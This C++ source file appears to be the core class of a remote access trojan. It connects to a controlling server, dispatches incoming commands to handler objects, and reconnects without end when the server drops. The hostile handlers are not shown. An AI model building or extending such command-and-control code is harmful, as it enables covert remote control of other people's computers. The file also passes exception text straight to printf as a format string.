#include "Rat.h"

#include "ChatHandler.h"
#include "CommunicationContainerBuilder.h"
#include "Trace.h"

Rat::Rat(
	std::shared_ptr<IConnectionFactory> client,
	std::shared_ptr<IConnection> connection,
	std::shared_ptr<IMessageSender> sender,
	std::shared_ptr<ICommunicationFactory> factory,
	std::vector<std::shared_ptr<IMessageHandler>> handlers
) :
	_client(std::move(client)),
	_connection(std::move(connection)),
	_sender(std::move(sender)),
	_listener(factory->CreateMessageListener(
		_connection.get(),
		[this](const MessageType type, const SharedSpan& content) { OnMessage(type, content); },
		[this] { OnDisconnection(); })),
	_handlers(std::move(handlers))
{
}

void Rat::OnMessage(const MessageType type, const SharedSpan content)
{
	try
	{
		std::vector<std::shared_ptr<IMessageHandler>> canHandle;

		std::ranges::copy_if(
			_handlers,
			std::back_inserter(canHandle), 
			[type](const std::shared_ptr<IMessageHandler> handler)
		    {
			    return handler->CanHandle(type);
		    });

		for (const auto& handler : canHandle)
		{
			handler->Handle(type, content);
		}
	}
	catch (std::exception& e)
	{
		printf(e.what());
	}
}

void Rat::OnDisconnection()
{
	Trace("Server disconnected! Trying to reconnect\n");

	bool connected = false;
	while (!connected)
	{
		try
		{
			//_connection.reset();
			*_connection = *_client->Connect();
			connected = true;
		}
		catch (std::runtime_error& e)
		{
			Trace("Failed to connect! Trying to reconnect\n%s\n", e.what());
		}
	}
}
